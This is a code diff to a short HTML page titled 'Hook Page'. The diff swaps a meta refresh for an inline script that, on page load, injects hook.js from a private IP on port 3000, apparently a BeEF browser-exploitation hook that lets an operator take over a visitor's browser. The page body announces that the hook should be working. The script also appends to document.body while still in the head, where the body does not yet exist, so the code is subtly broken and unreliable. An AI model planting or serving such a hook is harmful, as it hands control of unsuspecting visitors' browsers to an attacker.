@@ -1,8 +1,23 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta http-equiv="refresh" content="0; url=http://192.168.137.77:3000/hook.js" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hook Page</title>
+    <script>
+        (function() {
+            var url = 'http://192.168.137.77:3000/hook.js';
+            if (typeof beef === 'undefined') {
+                var bf = document.createElement('script');
+                bf.type = 'text/javascript';
+                bf.src = url;
+                document.body.appendChild(bf);
+            }
+        })();
+    </script>
 </head>
 <body>
+    <h1>Welcome to the Hook Page!</h1>
+    <p>If you're seeing this, the hook should be working!</p>
 </body>
 </html>
